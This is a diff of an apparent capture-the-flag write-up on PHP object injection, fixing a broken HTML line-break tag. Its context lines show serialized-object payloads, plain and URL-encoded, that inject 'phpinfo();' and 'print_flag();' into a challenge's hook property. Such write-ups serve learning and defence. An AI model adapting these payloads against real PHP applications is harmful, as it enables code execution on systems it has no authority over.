@@ -10,7 +10,7 @@ Serialization vulnerabilities are not just native to PHP. These vulnerabilities 
 So i just get the payload from owasp exemple n 2 :</br>
 https://www.owasp.org/index.php/PHP_Object_Injection </br>
 <code> data=O:8:"Example2":1:{s:14:"Example2 hook";s:10:"phpinfo();";} </code> </br>
-and i changed some parameters in the hackfest serilazed object, such as stirng lengths to conforme it with our inital php code :>/br>
+and i changed some parameters in the hackfest serilazed object, such as stirng lengths to conforme it with our inital php code :</br>
 <code> msg=O:8:"Hackfest":1:{s:14:"Hackfest hook";s:13:"print_flag();";} </code>
 with some url encode : </br>
 msg=O%3A8%3A%22Hackfest%22%3A1%3A%7Bs%3A14%3A%22Hackfest%20hook%22%3Bs%3A13%3A%22print_flag()%3B%22%3B%7D%20
